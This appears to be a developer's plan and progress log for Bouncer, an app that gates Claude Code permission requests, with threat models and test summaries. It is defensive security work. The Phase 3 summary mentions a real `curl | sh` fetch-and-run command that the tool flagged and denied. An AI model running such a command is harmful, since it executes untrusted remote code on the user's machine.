9. **Storage:** `preferences.json` gains `volume` (0–100, default 50),
   `style` (`playful` / `soft` / `retro`) and `sounds` (name → on / off,
   known names only); `sound` stays the master switch. Unknown or
   out-of-range values give the default, same checked atomic write.

Threats:

| Threat | Fix |
| --- | --- |
| A fun sound masks a risky alert | One sound at a time, risky > needs > rest; alarms harsh and low in every style |
| Sound spam with many sessions | 2-s repeat drop; frequent events off by default; one at a time |
| Loud surprise | Volume capped (100% = today's level ×2), default 50% |
| Idle CPU / battery | Context suspended after each sound (unchanged) |
| A tampered `preferences.json` | Known names and values only, volume clamped; never security policy |
| Copying sounds | All synthesized from code written here; nothing sampled or copied |

Done when:

- [ ] Listen-and-pick board in the prototype: 17 sounds × 3 styles, each
  playable, keep / change per cell; every sound a keep (Charan)
- [ ] Charan's calls: `PostToolUseFailure` (tool failed), launch "yo!"
- [ ] The app plays the picked pack: style, volume, per-sound on / off in
  Settings, saved in `preferences.json`
- [ ] Rules hold: one at a time, risky > needs > rest, 2-s repeat drop,
  quiet while paused, frequent ones off by default, context suspended
- [ ] Tests: recipes ≤ 1 s, priority, repeat drop, prefs parsing
- [ ] fmt, clippy, tests green locally and in CI; gitleaks rules checked

## Phase 6 — Chat in the island (~1.5 weeks)

- **Audit:** Claude Code's headless mode (`claude -p`): flags, output formats,
  session reuse, permission modes, how it authenticates (the user's own login, no
  API key, $0); which hooks fire in a headless session (Bouncer's own hooks will
  see it); how to cancel and time out a run.
- **Implement:** a chat panel in the island; each message runs the user's local
  `claude -p` as a child process (exec form, no shell, prompt on stdin, never in
  argv); streamed answer shown with `textContent`; locked-down tool permissions
  for chat runs; cancel button; clear "this runs your Claude Code" note.
- **Model picker** (Charan, 2026-10-03): chooses the model for chat runs,
  passed with `claude -p`'s model option (exact flag confirmed in the Audit),
  from a fixed list, never free text into argv. Default: the user's own
  Claude Code default (no model flag). Bouncer never changes the model of a
  user's Claude Code session or their Claude Code settings.
- **Test:** prompt with shell metacharacters stays literal; hostile model output
  renders inert; cancel and timeout kill the child; `claude` missing → clear message.
- **Verify:** Bouncer itself makes no network calls; no API key read or stored;
  chat history kept only if the user opts in, redacted like the activity log.

| Threat | Fix |
| --- | --- |
| Command / argument injection through the prompt | Exec form, prompt on stdin, fixed argv |
| Chat run takes actions on the machine | Locked-down permission mode / tool allow-list for chat runs; its requests still go through Bouncer |
| Model output injects markup | `textContent` only, same as agent text |
| Hung or runaway child | Timeout, cancel, killed on quit |
| Secrets in chat history | Off by default; redacted, owner-only, wipe |
| Wrong binary named `claude` on PATH | Resolve once, show the path, user confirms |

Phase 6 is done when:

- [ ] Chat round-trip through `claude -p` with no API key
- [ ] Injection, hostile-output, cancel and timeout tests pass
- [ ] Chat runs can't act without approval
- [ ] fmt, clippy, tests green locally and in CI

## Phase 7 — File drop (~1 week)

- **Audit:** Tauri drag-and-drop events (Phase 2 turned `dragDropEnabled` off);
  what a drop exposes (paths only, not contents); size and type limits; how a
  file is attached to a running session or asked about in chat.
- **Implement:** drop target on the island with a catch animation; choice: "Ask
  Claude about it" (Phase 6 chat) or "Attach to session"; size/type limits;
  preview of exactly what will be sent; nothing sent until the user confirms.
- **Test:** oversized, wrong-type, symlinked, directory and unreadable drops are
  refused with a reason; cancel sends nothing; file names render inert.
- **Verify:** file contents never stored (rule 7); no read before confirm beyond
  size/type checks.

| Threat | Fix |
| --- | --- |
| Sensitive file sent by accident | Preview + explicit confirm; nothing sent before it |
| Symlink / path tricks | Canonicalise; refuse symlinks and folders |
| Huge or binary file | Size and type limits checked before reading |
| Hostile file name | `textContent`; hidden characters made visible |
| Contents persisted | Never stored; only sent where the user chose |

Phase 7 is done when:

- [ ] Drop → catch animation → ask or attach → confirm → sent
- [ ] Every refusal case tested; cancel sends nothing
- [ ] fmt, clippy, tests green locally and in CI

## Phase 8 — Music (~1 week)

- **Audit:** Windows media controls (`GlobalSystemMediaTransportControlsSessionManager`
  via WinRT): what it needs (likely the `windows` crate, a new dependency to ask
  about), idle cost of listening; macOS later.
- **Implement (Windows):** now playing (title, artist, app) in the island;
  play/pause/skip for any player; the ball dances while music plays.
- **Test:** no player, several players, player closing mid-track; hostile track
  titles render inert.
- **Verify:** no network calls (no album-art fetching); idle CPU ~0%; feature can
  be turned off.

| Threat | Fix |
| --- | --- |
| Track metadata injects markup | `textContent`; hidden characters made visible |
| Listening costs CPU | Event-driven, no polling; off switch |
| New native dependency | Asked first; cargo deny; Windows-only target |

Phase 8 is done when:

- [ ] Now playing + play/pause/skip work with at least two players on Windows
- [ ] Ball dances while playing; reduced motion respected
- [ ] fmt, clippy, tests green locally and in CI

## Phase 9 — Packaging and release (~1 week)

- **Audit:** document unsigned-app warnings per OS; Defender false-positive process;
  check eligibility for free SignPath Foundation signing.
- **Implement:** release workflow on `v*` tags: macOS universal `.dmg`, Windows
  `.msi`, SHA-256 checksums, GitHub build attestations; README with pitch, demo GIF,
  install / verify / uninstall steps, privacy statement.
- **Test:** install, use, uninstall on clean Windows (own PC) and macOS (friend's Mac,
  using the CI build); `settings.json` restored exactly.
- **Verify:** only the release job can write; no secrets in logs; README alone is enough.
- Commits: `ci: release workflow with checksums and attestations` →
  `docs: install, verify and uninstall guide` → `chore: v1.0.0`

### macOS-only code from Phases 1–4 (2026-10-03)

There's no Mac for development; the friend's Mac is for the Phase 9 check only.
"CI" means a test on the `macos-latest` runner; "smoke" means the planned
`ci: macos smoke test` job (after Phase 4 merges: launch the debug app, feed
it a session and a request, take a screenshot, check modes).

| What | Where | Covered by |
| --- | --- | --- |
| Socket path `~/Library/Application Support/Bouncer/bouncer.sock` | `relay/src/unix.rs` | CI (path unit test); smoke (the real folder) |
| Server refuses a socket folder that isn't `0700` and ours | `core/src/ipc.rs` | CI (`refuses_a_folder_others_can_open`); smoke (real folder is `0700`) |
| `getpeereid` same-user check, both ends | `relay/src/unix.rs`, `core/src/ipc.rs` | CI for the same-user path (ipc and relay tests connect through it). **Another user refused: human** |
| Relay fail-safe over the socket (no app, slow app) | `relay/tests` | CI |
| Rules file / folder owner + mode check, links refused | `core/src/rules.rs` | CI (`files_others_can_write_are_refused`) |
| Rules file created `0600`, folder `0700` | `core/src/rules.rs` | CI |
| Log folder `0700`, day files `0600`, shared folder refused | `core/src/activity.rs` | CI (`files_are_private_and_shared_folders_refused`); smoke (real files) |
| `install-hooks` backup keeps the file's mode | `core/tests/install.rs` | CI |
| Symlinked paths (`/private/var` temp, links out of the project) | `core/src/check.rs`, `rules_cases.rs` | CI |
| Idle time from CoreGraphics (`CGEventSourceSecondsSinceLastEventType`) | `core/src/away.rs` | CI (call returns a value). **Real idle → away summary: human** |
| No Dock icon (`ActivationPolicy::Accessory`) | `app/src/main.rs` | **Human** |
| Menu-bar tray icon, greyed when paused, menu items | `app/src/main.rs` | **Human** |
| Transparent rounded window and shadow (`ROUNDED`); square fallback if it fails | `app/src/main.rs`, `styles.css` | Smoke (screenshot). **Look and corners: human** |
| Window never takes focus; first click works (`focusable: false`, `acceptFirstMouse`) | `tauri.conf.json` | **Human** |
| Placement under the menu bar, drag, multi-monitor, stays on screen | `app/src/main.rs` | **Human** |
| OS fonts (Segoe UI isn't on macOS; falls back to `system-ui`) | `styles.css` | Smoke (screenshot). **Human** |
| Real Claude Code on a Mac: hooks installed, Bash requests approved / denied from the island | all | **Human** |
| Unsigned app opens after "Open Anyway" | release | **Human** (Phase 9 itself) |

Mac checks for Phase 9 (a person on a real Mac):

- [ ] A second macOS user can't connect to the socket (getpeereid refusal)
- [ ] Idle 10+ minutes during a session, come back: the away summary opens
- [ ] No Dock icon; tray icon in the menu bar; Pause greys it and changes the tooltip; Wipe history and Quit work
- [ ] Island corners rounded with a shadow, nothing opaque around it; fonts look right
- [ ] The island never takes keyboard focus; one click on Allow / Deny works
- [ ] Tray "Open Bouncer" / "Settings…" give the island the keyboard (Tab, Esc); clicking elsewhere gives it back (5b `set_focusable` toggling)
- [ ] Sounds play without clicking the island first (WKWebView autoplay); idle CPU stays ~0 after a sound
- [ ] Island sits under the menu bar, can be dragged, comes back if dropped off screen, crosses monitors
- [ ] Real Claude Code session: hooks installed with `bouncer install-hooks`, a Bash request allowed and one denied from the island, an unanswered one falls back to the terminal
- [ ] Unsigned `.dmg` opens after "Open Anyway"; uninstall removes only our hook entries

---

## Threat model

Core rule: every failure means "ask in the terminal," never "allow."

| Threat | Fix | Phase |
| --- | --- | --- |
| App fails open | Errors/timeouts return empty output; tests assert no default allow | 1 |
| App blocks the agent | Hard relay deadlines; exit 0 if app missing | 1 |
| Another user answers approvals | User-only socket/pipe + same-user check both ends | 1 |
| Oversized / malformed input | 1 MB cap, field trimming, parse failure → exit 0 | 1 |
| Settings file damaged | Backup, merge, diff, confirm, atomic write | 1 |
| Script injection in island | `textContent` only, strict CSP, minimal capabilities | 2 |
| Forged / replayed approval | Single-use random request IDs | 2 |
| Accidental approval | 600 ms arm delay, no default focus, Enter doesn't approve | 2 |
| Disguised dangerous command | Real parser, compound needs all parts allowed, unparsed → ask, hidden chars flagged | 3 |
| Path escape | Resolve fully; outside project → ask | 3 |
| Rules file tampering | Refuse files others can write; show changes | 3 |
| Secrets in history | Redact, no outputs, local, owner-only, retention, wipe | 4 |
| Supply chain | Few deps, lockfiles, cargo deny (+ weekly advisories), npm audit, Dependabot, SHA-pinned Actions | 0 |
| Chat run acts or is injected | Exec form, prompt on stdin, locked-down chat permissions | 6 |
| File sent by accident | Preview + confirm; limits; symlinks refused; contents never stored | 7 |
| Untrusted media / file / model text | `textContent`, hidden characters made visible | 5–8 |
| Tampered download | CI-only builds, checksums, attestations | 9 |

Out of scope: malware already running as the user (it can edit Claude Code's
settings directly). The README says so.

## Cost

$0. macOS: no Apple Developer Program ($99/yr) — users click "Open Anyway" once in
Privacy & Security. Windows: unsigned unless SignPath Foundation accepts the project —
users click "More info → Run anyway" once. CI, scanning and attestations are free for
public repos. No paid APIs.

## Decisions

- Name: **Bouncer**, bouncing-ball character.
- Repo and package name: **`bouncer-app`** (github.com/charanp11/bouncer-app).
  `bouncer` is taken on crates.io ("CLI sandboxing toolkit", 2026) and npm, and
  several small Claude Code permission-hook projects on GitHub already use it
  (karanb192/bouncer, karlkfi/claude-bouncer, clownware/bouncer). Crates are
  prefixed `bouncer-` (`bouncer-relay`, `bouncer-core`, `bouncer-app`); the app
  name stays Bouncer.
- Test machines: Charan's Windows PC; a friend's Mac (CI builds) for manual tests.
- Risky actions are flagged, never auto-denied, in the MVP.
- Lowest supported Claude Code version: **2.1.139** (Phase 1 audit).
- Scope (2026-10-02): Phases 5–8 (character, chat via local `claude -p`, file
  drop, music) added after the security core; packaging is Phase 9. None starts
  before Phase 4 is merged.

## Phase summaries

(Added as each phase passes Verify.)

### Setup summary (2026-10-01)

Toolchain already present: git 2.51.2, Node 24.11.0, rustc/cargo 1.99.0
(stable-x86_64-pc-windows-msvc) with clippy and rustfmt, winget 1.29, WebView2
154.0. Nothing needed installing. `git init -b main`; repo-local identity
`Charan <177669994+charanp11@users.noreply.github.com>`.

### Phase 0 summary (2026-10-01)

- Repo: github.com/charanp11/bouncer-app, public. Crates `bouncer-relay` (binary
  `bouncer-hook`, no dependencies yet), `bouncer-core` (empty), `bouncer-app` (Tauri
  2.12 shell). Frontend: Vite 8 + TypeScript 7, no UI framework.
- The Tauri shell has the CSP from the audit, a looser `devCsp` for dev only (Vite
  injects styles and uses an HMR websocket), `freezePrototype`, no plugins, no
  commands, an empty command allow-list in `build.rs`, and one capability for
  `main` with no permissions. Vite listens on `127.0.0.1:1420` only.
- CI (`ci.yml`): fmt, clippy `-D warnings` and tests on Windows and macOS (the
  frontend is built first); `cargo deny check`, `npm audit` and gitleaks on Linux.
  `advisories.yml` runs `cargo deny check advisories` every Monday. Actions pinned to
  SHAs; `permissions: contents: read`; checkout without persisted credentials.
- GitHub: private vulnerability reporting, Dependabot alerts and security fixes,
  read-only default Actions token, Actions can't approve PRs, rebase-merge only,
  branches deleted after merge. `main` protection: PR required (0 approvals), the
  five CI checks required (bound to GitHub Actions) and up to date, linear history,
  no force push or deletion, admins included.
- Tests: 1 (the relay prints nothing and exits 0), passing locally and in CI on
  both OSes.
- Notes: the repo was recreated once to drop a line from early history. Dependabot
  version updates and the weekly advisories job only start once their files are on
  `main`; run `advisories.yml` once by hand after the merge. cargo-deny warns about
  duplicate crate versions from Tauri's tree (allowed as warnings).

### Phase 1 summary (2026-10-02)

- `bouncer-hook` (relay): reads one hook event (≤ 1 MB, else dropped whole),
  drops `tool_response` / `transcript_path`, forwards it as one JSON line. All
  blocking work, stdin included, runs on a worker under a 2 s budget, extended to
  110 s only for `PermissionRequest`. Prints only for an exact `allow` / `deny`
  from a same-user app. Dependencies: `serde_json`, plus `windows-sys` on Windows.
- Transport: Windows named pipe `\.\pipe\bouncer-<SID>` with a protected
  user-only DACL, `FIRST_PIPE_INSTANCE`, remote clients rejected, SID checked on
  both ends. macOS: socket in `$TMPDIR/bouncer-<uid>/` (`0700`, owner and mode
  checked), `getpeereid` on both ends.
- `bouncer-core`: `Event` (agent, session, project, kind, tool, input, time); the
  `ipc` server; `hooks` install/uninstall logic and the `bouncer` CLI. The app
  starts the server and answers nothing yet (every request falls back to the
  terminal). `examples/answer.rs` is a console stand-in used for manual checks.
- `bouncer install-hooks` / `uninstall-hooks`: exec-form hooks for eight events,
  diff, `y` required, dated backup, atomic rename, key order kept.
- Lowest supported Claude Code: 2.1.139.
- Tests: 35 (relay 17, core 18), green locally and in CI on Windows and macOS.
  Fixtures: 12 events from Claude Code 2.1.143 (incl. two real
  `PermissionRequest`s; nine were first mislabeled 2.1.287, fixed after review)
  and 10 from 2.1.287 (incl. one `PermissionRequest`), added after review.
- Checked by hand: playground session allowed a Write through Bouncer; unanswered
  requests fell back to the terminal prompt; `git status` (already allowed by
  Claude Code) fired only `PreToolUse`; the live pipe's DACL read back user-only.
- Denied by hand: a real Write denied through Bouncer showed "Denied in Bouncer /
  Denied by PermissionRequest hook" and the file wasn't created.
- Not done by hand: a second Windows/macOS account trying to connect (no second
  account; DACL and peer checks reviewed instead); the macOS socket was exercised
  only by CI.
- Note for Phase 3: in Claude Code's `auto` permission mode, Claude Code approves
  many actions itself and no `PermissionRequest` fires; Bouncer only sees them
  through `PreToolUse`.
- Dependabot alert #1 (glib < 0.20, GHSA-wrw7-89jp-8q8g): reaches us only through
  Tauri's Linux GTK stack; not compiled for Windows or macOS. Dismissed as
  "vulnerable code is not used".

### Phase 2 summary (2026-10-02)

- Review follow-ups from PR #2 first: `BOUNCER_ENDPOINT` debug/test only (CI
  checks release); backups keep the original's permissions; macOS socket in
  `~/Library/Application Support/Bouncer/`; `CLAUDE_CONFIG_DIR` tested and an
  empty value refused; fixtures relabelled by their real recording version
  (nine were 2.1.143, not 2.1.287) with a test tying names to recordings; a
  counting race in two relay tests fixed.
- `bouncer-core::approvals`: the desk. FIFO queue across sessions; random
  128-bit single-use request IDs (std only); 100 s wait under the relay's shared
  110 s budget; Allow refused within 600 ms; pause releases everything to the
  terminal; sessions with folder, current step and state; agent text made
  visible-safe (controls, ANSI, bidi, zero-width, tag characters).
- The island (Tauri): undecorated, always on top, no taskbar entry, never takes
  focus (`focusable: false`); hidden / pill / open; sizes itself to its content;
  draggable, remembers its spot, stays on screen, crosses monitors. Approval card
  with full command, "1 of N", Deny / Allow once (arms after 600 ms). Five
  commands only (`subscribe`, `decide`, `expand`, `drag`, `fit`); no plugins; CSP
  unchanged. Tray: Pause / Resume (grey icon + tooltip) and Quit.
- New dependency: `@tauri-apps/api` 2.12.1 (approved). Tauri `tray-icon` feature
  on (no new crates).
- Tests: 55 (relay 21, core 30, app 4), green locally and in CI on Windows and
  macOS. Fixtures: 12 from Claude Code 2.1.143, 11 from 2.1.287.
- Checked by hand (Charan, Windows, two monitors; Claude Code 2.1.287): real
  allow, deny and timeout-to-terminal from the island; three sessions with a
  queue; focus never left the app being typed in; hostile text inert; tray pause
  / resume / quit; drag, corners, taskbar recovery, monitor crossing.
- Not done by hand: macOS (no Mac this phase; CI builds and tests only); screen
  reader / keyboard access (Phase 5).
- Visual design is deliberately bare; the final design comes as an HTML
  prototype in `design/prototype/`.

### Phase 3 summary (2026-10-03)

- `bouncer-core::shell`: a POSIX shell parser for Bash tool commands (words,
  quotes, escapes, comments, compound operators, redirections). Anything it
  can't be sure about is an issue that blocks auto-allow: substitutions,
  variables, grouping, heredocs, `NAME=value`, unterminated or dangling input.
- PowerShell (Claude Code's tool on Windows): only plain commands (ASCII
  letters, digits, space, `. \ / : - _`) can be auto-allowed; the program
  matches ignoring case, only against existing rules; every risk check runs.
- `bouncer-core::rules`: `rules.toml` (`toml` 1.1.6, parse only) in
  `%APPDATA%\Bouncer` / `~/Library/Application Support/Bouncer`, written with
  defaults in observe mode. Strict: 64 KB cap, unknown keys, wrong types,
  unknown tools and non-plain commands refused with the line number; refused
  too if anyone else can write the file or its folder (owner + mode on macOS,
  owner + DACL on Windows) or it's a link. Any refusal falls back to the
  built-in rules in observe mode and shows in the island. Rules can be scoped
  (`exact`, `path`, `project`, compared fully resolved).
- `bouncer-core::check`: every command part must match a rule, every path
  (arguments, `--opt=value`, `-Opt:value`, redirections, tool paths, globs)
  must resolve inside the session's project (symlinks followed, `..` applied
  like the OS); root or home as the project never auto-allows. Twelve risk
  reasons joined into one sentence; risky requests are never auto-allowed or
  offered.
- Desk: auto mode answers what a rule allows (pill flash, rail tag
  "auto-allowed by rule"); observe mode adds "Would auto-allow" to the card;
  `always(id)` (sixth command) adds the backend's own exact, project-scoped
  rule, then allows; the rules file is checked every 2 s and changes or errors
  reach the island; `AskUserQuestion` / `ExitPlanMode` are never answered and
  the session shows "Needs you · question in the terminal". Paused answers
  nothing, rules included.
- Island: Risky request, Auto-allowed and Always allow built to the prototype
  (v0.4 for Always allow, committed in this PR); observe note, rules notice
  and red "rules" badge reuse its card, badge and box styles.
- Request IDs: 128 bits from `getrandom` 0.4; no ID → no card (terminal asks).
- New dependencies: `toml` 1.1.6 (approved), `getrandom` 0.4.3 (requested);
  both were already in `Cargo.lock`.
- Tests: 102 Rust (relay 22, core 75, app 5) + 11 frontend. Case tables: 214
  Bash rows, 91 PowerShell rows, 32 tool rows, scoped-rule and recorded-request
  tests; fuzzing: 5,000 generated Bash commands, 5,000 random strings and
  5,000 generated PowerShell commands.
- Checked by hand (Charan, Claude Code 2.1.288, Windows playground): a real
  `cargo check` auto-allowed; a real `curl | sh` flagged Risky and denied; the rules-file error badge and line
  number; "Always allow" end to end. Found and fixed through those runs:
  PowerShell commands, the over-broad "Bouncer's own rules" flag, questions
  shown as Allow/Deny cards.
- Not done by hand: macOS (CI only).
- Plan additions (Charan): an observe/auto switch in the island (Phase 5) and
  a model picker for chat (Phase 6).

### Phase 4 summary (2026-10-03)

- `bouncer-core::activity`: the local activity log. JSON Lines, one file per
  UTC day, in `history/` next to `rules.toml`; owner-only, refused when
  anyone else can write the file or folder; one event per line, bad lines
  skipped; 10 MB per day, then a quiet note in the island; 30-day retention;
  "Wipe history" in the tray. Only the app writes it; no new dependency
  (Charan chose JSON Lines over SQLite).
- Stored: time, session, folder, hook kind, tool, step label (first command
  line, 200 characters), the path for edit tools, and how a request ended.
  Never outputs, file contents, prompts, notification text or URLs.
- `bouncer-core::redact`: six families (private keys, URL passwords, 24
  token prefixes, secret-named assignments / flags / headers, Bearer and
  Basic, long random-looking runs), run on every field before writing; the
  whole command and paths are redacted before the label is made.
- `bouncer-core::away`: OS idle time (`GetLastInputInfo`, CoreGraphics);
  10+ idle minutes and then input opens the island on "While you were away"
  (files changed, commands, auto-allowed, asked you, where it got stuck, the
  sessions), built to the prototype; × drops it. No new IPC command.
- Sessions that never end drop off after 30 min (4 h when waiting on you);
  never while a card is up.
- Test speed: fuzz tests run 500 rounds locally, 5,000 in CI; the local
  suite takes about 30 s. CI's check job is capped at 30 min.
- Tests: 122 Rust tests on Windows (129 with the macOS-only ones; relay
  23, core 101, app 5) + 11 frontend; green locally and in CI on Windows and
  macOS. Fixtures: a fake-secret table (built at run time) and a 30-minute
  two-session span.
- Checked by hand (Charan, Claude Code 2.1.288, Windows): away summary with
  and without a stuck request, closing, redaction in the real file, folder
  permissions, wipe. Found: Claude Code now runs read-only commands like
  `hostname` without a permission request, so they never reach Bouncer.
- Not done by hand: the 30-minute session drop-off (unit test); macOS (see
  "Mac checks for Phase 9").
- Next: a separate `ci: macos smoke test` PR (Charan), then Phase 5.

### Phase 5a summary (2026-10-03)

- Bouncer moves from code: `motion.ts` (no DOM) is a fixed-step physics body
  (1/240 s steps, frames clamped to 50 ms) with gravity, squash 0.84 and
  stretch 1.12 to the spec's 9-unit, 900 ms jump; `ball.ts` writes it into
  the prototype's SVG as transforms. One Motion survives re-renders, so a
  rebuilt island no longer restarts him.
- Seven moods from "Meet Bouncer": idle breathes ~10 s then holds still,
  working jumps, needs you hops twice every 1.6 s with "!", risky turns red
  and puffs up, done cheers when a session finishes (working → idle), paused
  sleeps, dance is drawn (Phase 8 triggers it). Launch greeting: he drops in
  and bounces ("Bouncer · at the door", 2.5 s); never over a card, the paused
  pill or an open island.
- The shades are the eyes (Charan): the face looks toward the cursor from
  the page's own mouse events (no backend feed), blinks every 8–12 s as two
  repaints; a click squashes him without opening the island, four quick
  clicks make him dizzy.
- Frames run only while something moves; none when hidden, settled or with
  OS reduced motion (no bounce, breathing, tracking or blink then).
- `redact.rs`: JSON secret values end at an unescaped quote, so nothing
  after `\"` leaks (run-time fake-secret tests).
- Tests: 123 Rust + 28 frontend (motion 12, mood 4), green locally; gitleaks
  rules checked on every added line.
- Checked in the app (see Verify above): idle CPU, card arming / focus /
  overlap, reduced motion, moods.
- Not checked by hand yet (Charan): the feel of looking, squish and dizzy
  with a real mouse in the island; a real Claude Code session; macOS.

### Phase 5b summary (2026-10-04)

- Settings screen (prototype v0.8–v0.10 first): Size (100 / 112 / 125%,
  Medium default), Sound, Auto-allow, Wipe history (confirm, armed), the
  rules file path, hook status ("installed" / "not installed: run bouncer
  install-hooks"; install stays in the CLI until the Phase 9 installer).
  Opened from a cog in the session list or the tray ("Settings…").
- Preferences in `preferences.json` next to `rules.toml`, read with the
  rules file's checks, written atomically, known values only.
- One island scale for everything, capped at 40% of the screen's width and
  the work area's height; Settings compact enough for a 768-px screen.
- Observe / auto switch: `rules::set_mode` rewrites only the mode line and
  checks the read-back; turning auto on asks (focus on Cancel, Esc cancels,
  Enter never, armed 600 ms).
- Three generated sounds (needs you, risky, done), one at a time, repeats
  within 2 s dropped, none while paused or muted; the audio context is
  suspended after each.
- Keyboard access only when opened on purpose (tray "Open Bouncer" /
  "Settings…", the cog): Tab stays in the island, Enter never presses an
  armed button, Space works once armed, a new card focuses its Deny, Esc
  gives the keyboard back; losing focus makes the window non-focusable
  again. Screen readers get one short sentence per event (a separate live
  region) instead of the whole island.
- Contrast fixed to ≥ 4.5:1 (faint text, line numbers, risky badge).
- Fixed on the way: a queued card could arm behind the Allowed / Denied
  message.
- Tests: 133 Rust + 36 frontend, green locally.
- Needs Charan by hand: tray items and real OS focus, Narrator reading
  order, the sounds by ear, Settings on his screen.

### Phase 5c summary (2026-10-04)

- Prototype v0.11 first (approved): the morph, the window order, peek on
  hover, the ticker, a "Show window" / "Slow ×4" / "Reduced motion" demo.
- The island morphs with one Web Animation (width, height, radius, color,
  and the 8-px drop from the strip): 320 ms spring growing, 200 ms ease-out
  closing. Growing, the window is asked for the bigger size first and the
  island waits (150 ms at most); closing, the window shrinks after. Two
  window resizes per change instead of one per frame. The 8-px top gap is
  inside the window now, so the island grows out of the screen's top edge.
- A card is never animated, nothing morphs while one is in front, and its
  600 ms arm starts when the window holds the whole card (was: when drawn).
  The content "rise" plays only when growing (it replayed on every
  re-render, cards included).
- `+N −M` on the working pill (Edit, MultiEdit summed; Write `+N`); the
  activity log stores the two numbers, never the text.
- `line_ops` treats an edit over 1,000,000 table cells as a whole
  replacement (memory ≤ 4 MB).
- Reduced motion: no morph, no rise, one-step resize.
- Fixed on the way: the pill flashed between a decision and its "Allowed /
  Denied" message.
- Tests: 137 Rust + 41 frontend, green locally.
- Needs Charan by hand: the feel of the motion on his screen (and peek on
  hover with a real mouse); macOS.
- After review (Charan): fixed the strip flicker on hover and the code
  pane's lines laid out side by side; peek delay 200 ms. Known: a one-frame
  sideways jump when the island's width changes, fixed next in "Island
  window region".
